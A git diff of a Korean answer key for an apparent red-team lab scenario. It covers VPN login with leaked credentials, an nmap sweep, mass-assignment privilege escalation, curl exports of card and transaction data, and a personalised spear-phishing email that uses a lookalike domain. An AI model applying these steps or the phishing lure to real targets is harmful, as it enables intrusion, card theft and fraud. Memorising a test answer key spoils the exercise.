@@ -1,6 +1,6 @@
 # 공격 체인 — 정답 루트
 
-Red Team 시나리오 전체 흐름. GitHub credential 발견부터 데이터 탈취까지.
+Red Team 시나리오 전체 흐름. GitHub credential 발견부터 스피어피싱까지.
 
 ---
 
@@ -11,11 +11,12 @@ Red Team 시나리오 전체 흐름. GitHub credential 발견부터 데이터 �
 ② VPN credential 발견
 ③ VPN 접속
 ④ 내부망 포트 스캔
-⑤ Admin API 발견
-⑥ Admin 로그인
-⑦ export API 발견
-⑧ 대량 export
+⑤ Admin 대시보드 발견 및 로그인
+⑥ 고객 데이터 export
+⑦ Mass Assignment로 권한 상승
+⑧ 카드/결제/거래 데이터 export
 ⑨ MinIO 저장
+⑩ 스피어피싱 이메일 발송
 ```
 
 ---
@@ -49,7 +50,7 @@ master 브랜치 깊은 히스토리 → `.env.bak` 삭제 커밋:
 VPN_HOST=vpn.argos-internal.com
 VPN_USER=deploy-bot
 VPN_PASS=d3pl0y-B0t@secure    ← MFA 없음 → VPN 접속 성공
-ADMIN_URL=http://10.10.0.10/admin
+ADMIN_URL=http://10.10.0.10/admin  ← 내부망 admin 서버 힌트
 ROLE=deploy
 ```
 
@@ -60,7 +61,6 @@ ROLE=deploy
 `.ovpn` 파일 + credential로 접속:
 
 ```bash
-# deploy-bot.ovpn 다운로드 후
 sudo openvpn ~/deploy-bot.ovpn
 # username: deploy-bot
 # password: d3pl0y-B0t@secure
@@ -74,24 +74,21 @@ ifconfig 10.8.0.6   ← 내부망 IP 할당
 
 VPN 접속 로그에서 내부망 대역 확인:
 ```
-PUSH: Received control message:
-'PUSH_REPLY,route 10.10.0.0 255.255.0.0,...'
+PUSH_REPLY,route 10.10.0.0 255.255.0.0,...
 ```
 
 → `10.10.0.0/16`이 내부망 대역임을 확인
-→ 이 대역에 내부 서버들이 존재함을 유추
 
 ---
 
 ## ④ 내부망 포트 스캔
 
-git log에서 `ADMIN_URL=http://10.10.0.10/admin` 힌트 확인.
-VPN 로그에서 내부망 대역 `10.10.0.0/16` 확인.
-실제 서비스가 어느 IP에 있는지는 스캔으로 찾아야 함.
+`.env.bak`에서 `ADMIN_URL=http://10.10.0.10/admin` 힌트 확인.
+내부망 대역 `10.10.0.0/16`에서 관리자 API에 자주 쓰이는 포트 스캔.
 
 ```bash
-# 내부망 전체에서 8001, 8080 포트 스캔
-nmap -Pn -sT -p 8001,8080 --max-rtt-timeout 10s 10.10.0.0/16
+# top-ports: 실제 인터넷에서 가장 많이 사용되는 포트 상위 1000개 스캔
+nmap -Pn -sT --top-ports 1000 --max-rtt-timeout 10s 10.10.0.0/16
 ```
 
 결과에서 8001 open인 IP 발견:
@@ -102,43 +99,17 @@ nmap -Pn -sT -p 8001,8080 --max-rtt-timeout 10s 10.10.0.0/16
 
 ---
 
-## ⑤ Admin API 구조 파악
+## ⑤ Admin 대시보드 발견 및 로그인
 
-```bash
-# Swagger 확인
-curl http://10.10.3.2:8001/docs
+브라우저에서 `http://10.10.3.2` 접속 → Admin 로그인 화면 발견.
 
-# 전체 엔드포인트 목록
-curl http://10.10.3.2:8001/openapi.json | python3 -c "
-import json, sys
-data = json.load(sys.stdin)
-for path in data['paths']:
-    print(path)
-"
+**동일 비밀번호 재사용** (VPN과 Admin API 동일):
+```
+username: deploy-bot
+password: d3pl0y-B0t@secure
 ```
 
-발견된 주요 엔드포인트:
-```
-/auth/admin/login          ← 관리자 로그인
-/admin/export/customers    ← 고객 데이터 export
-/admin/export/devices      ← 디바이스 export
-/admin/staff               ← 직원 계정 목록
-```
-
----
-
-## ⑥ Admin 로그인
-
-GitHub에서 발견한 credential로 로그인 시도 (VPN과 동일한 비밀번호):
-
-```bash
-curl -X POST "http://10.10.3.2:8001/auth/admin/login" \
-  -H "Content-Type: application/json" \
-  -d '{"username": "deploy-bot", "password": "d3pl0y-B0t@secure"}' \
-  --max-time 30
-```
-
-응답:
+로그인 응답:
 ```json
 {
   "token": "eyJhbGciOiJIUzI1NiJ9...",
@@ -149,16 +120,12 @@ curl -X POST "http://10.10.3.2:8001/auth/admin/login" \
 
 ---
 
-## ⑦ 권한 검증 미흡 확인
+## ⑥ 고객 데이터 export
 
-`operator` role로 export 가능. tenant_id 소유권 검증 없음.
+대시보드 Tenants/Customers 페이지 → CSV/JSON export.
 
----
-
-## ⑧ 대량 export 수행
-
+또는 API 직접 호출:
 ```bash
-# 전체 고객 데이터 export (101건)
 curl -X POST "http://10.10.3.2:8001/admin/export/customers" \
   -H "Authorization: Bearer {JWT}" \
   --max-time 120
@@ -167,30 +134,144 @@ curl -X POST "http://10.10.3.2:8001/admin/export/customers" \
 응답:
 ```json
 {
-  "record_count": 101,
-  "filename": "customers_20260517_114607.csv",
-  "minio_url": "http://10.10.4.2:9000/exports/customers_20260517_114607.csv",
-  "download_url": "/admin/export/download/customers_20260517_114607.csv"
+  "record_count": 100,
+  "filename": "customers_20260519_054949.csv",
+  "minio_url": "http://10.10.4.2:9000/exports/customers_20260519_054949.csv",
+  "download_url": "/admin/export/download/customers_20260519_054949.csv"
 }
 ```
 
-파일 다운로드:
-```bash
-curl "http://10.10.3.2:8001/admin/export/download/customers_20260517_114607.csv" \
-  -H "Authorization: Bearer {JWT}" \
-  -o ~/customers.csv
+탈취 데이터:
+```
+customer_id, tenant_id, username(이름), email, account_status, last_access_ip ...
 ```
 
 ---
 
-## ⑨ MinIO 영구 보관
+## ⑦ Mass Assignment로 권한 상승
 
-```bash
-# VPN 접속 상태에서 MinIO 직접 접근 (인증 불필요 - public 버킷)
-curl http://10.10.4.2:9000/exports/customers_20260517_114607.csv -o ~/customers.csv
+operator role로는 결제/카드 데이터 접근 불가 → admin으로 권한 상승.
+
+**Burp Suite 프록시 설정 (127.0.0.1:8081)**
+
+대시보드 우측 상단 아바타 → Settings → username 수정 → 저장 클릭.
+
+Burp Suite가 PATCH 요청 가로채기:
+```
+PATCH /admin/staff/me HTTP/1.1
+Host: 10.10.3.2:8001
+Authorization: Bearer {JWT}
+
+{"username": "deploy-bot"}
 ```
 
-URL만 알면 언제든 재접근 가능. VPN 재접속 후 바로 사용 가능.
+body에 role 필드 추가 후 Forward:
+```json
+{"username": "deploy-bot", "role": "admin"}
+```
+
+백엔드가 검증 없이 role 변경 → DB 반영.
+
+**재로그인** → admin JWT 발급:
+```json
+{
+  "token": "eyJhbGciOiJIUzI1NiJ9...",
+  "username": "deploy-bot",
+  "role": "admin"    ← 변경됨
+}
+```
+
+---
+
+## ⑧ 카드/결제/거래 데이터 export
+
+admin role로 Payment Info, Transactions 페이지 접근 가능.
+
+```bash
+# 카드 정보 export
+curl -X POST "http://10.10.3.2:8001/admin/export/payment-info" \
+  -H "Authorization: Bearer {admin_JWT}" \
+  --max-time 120
+
+# 거래 내역 export
+curl -X POST "http://10.10.3.2:8001/admin/export/transactions" \
+  -H "Authorization: Bearer {admin_JWT}" \
+  --max-time 120
+```
+
+탈취 데이터:
+```
+payment_id, customer_id, card_last4, card_brand, card_expiry,
+card_holder, billing_addr, pg_token ...
+
+transaction_id, customer_id, product_type, amount, pg_name,
+card_last4, status, transaction_at ...
+```
+
+---
+
+## ⑨ MinIO 저장
+
+export 응답의 `minio_url`로 직접 접근 (public 버킷):
+```bash
+curl http://10.10.4.2:9000/exports/payment_info_20260519_054038.csv
+```
+
+URL만 알면 VPN 재접속 후에도 언제든 재접근 가능.
+
+---
+
+## ⑩ 스피어피싱 이메일 발송
+
+고객 정보 + 카드 정보 + 거래 내역을 조합해 개인화된 피싱 이메일 생성.
+
+### 데이터 조합 예시 (김민준)
+
+```
+이름:     김민준
+이메일:   minjun.kim@naver.com
+카드:     VISA *6882 (만료 02/2028)
+최근거래: 디바이스 구매 89,000원
+```
+
+### 피싱 이메일
+
+```
+제목: [ARGOS] 결제 승인 오류 안내 - 즉시 확인이 필요합니다
+
+김민준 고객님께,
+
+고객님께서 최근 진행하신 아래 결제 건에서 카드사 승인 처리 중
+오류가 발생하였습니다.
+
+─────────────────────────────────
+결제 일시: 2026-05-19 14:23:08
+결제 수단: VISA ****-****-****-6882
+결제 금액: 89,000원 (VAT 포함)
+주문 내용: ARGOS 디바이스 구매
+오류 코드: ERR-CARD-3014 (카드사 일시적 승인 거절)
+─────────────────────────────────
+
+결제가 정상 처리되지 않아 서비스 이용에 제한이 발생할 수 있습니다.
+아래 링크를 통해 결제 정보를 재확인해 주시기 바랍니다.
+
+👉 결제 정보 확인하기 → http://argos-payment-help.com/verify?uid=CUST-A-001
+
+결제 관련 문의사항이 있으시면 고객센터(1588-0000)로 연락 주시기 바랍니다.
+
+ARGOS 고객보안팀 드림
+cs@argos-iot.co.kr
+```
+
+### 왜 속는가
+
+| 요소 | 내용 |
+|---|---|
+| 실명 | 김민준 — 실제 이름 |
+| 실제 카드 끝 4자리 | *6882 — 본인 카드 확신 |
+| 실제 결제 금액 | 89,000원 — 실제 거래 내역과 일치 |
+| 실제 서비스명 | ARGOS — 가입한 서비스 |
+| 자연스러운 문체 | 과도한 긴박감 없이 안내 메일처럼 보임 |
 
 ---
 
@@ -201,19 +282,17 @@ URL만 알면 언제든 재접근 가능. VPN 재접속 후 바로 사용 가능
 | Credential GitHub 노출 | `.env.bak` 커밋 히스토리에 VPN 계정 정보 |
 | VPN MFA 미적용 | deploy-bot 계정 MFA 없음 → credential만으로 접속 |
 | 동일 비밀번호 사용 | VPN과 Admin API 동일 → 1개 탈취로 2개 시스템 접근 |
-| Swagger 공개 | 인증 없이 전체 API 구조 노출 |
 | OWASP A01 (Broken Access Control) | operator가 전체 테넌트 데이터 export 가능 |
-| MinIO public 버킷 | Presigned URL 없이 영구 공개 URL |
-| Download role 체크 없음 | viewer도 파일명만 알면 다운로드 가능 (export는 403인데 download는 통과) |
+| Mass Assignment | PATCH /admin/staff/me role 필드 검증 없음 → 권한 상승 |
+| MinIO public 버킷 | URL만 알면 영구 접근 가능 |
+| 결제 API role 체크 없음 | 프론트만 admin 체크, 백엔드 미검증 |
 
 ---
 
 ## 계정별 결과
 
-| 계정 | VPN | Admin 로그인 | export |
-|---|---|---|---|
-| dev01 | 실패 (MFA) | X | X |
-| dev02 | 실패 (MFA) | X | X |
-| firmware-admin | 실패 (MFA) | O | O |
-| ops-monitor | 성공 | O (viewer) | X (403) |
-| **deploy-bot** | **성공** | **O (operator)** | **O ← 정답** |
+| 계정 | VPN | Admin 로그인 | export | 권한 상승 | 결제 데이터 |
+|---|---|---|---|---|---|
+| firmware-admin | 실패 (MFA) | X | X | X | X |
+| ops-monitor | 성공 | O (developer) | X | X | X |
+| **deploy-bot** | **성공** | **O (operator→admin)** | **O** | **O** | **O ← 정답** |
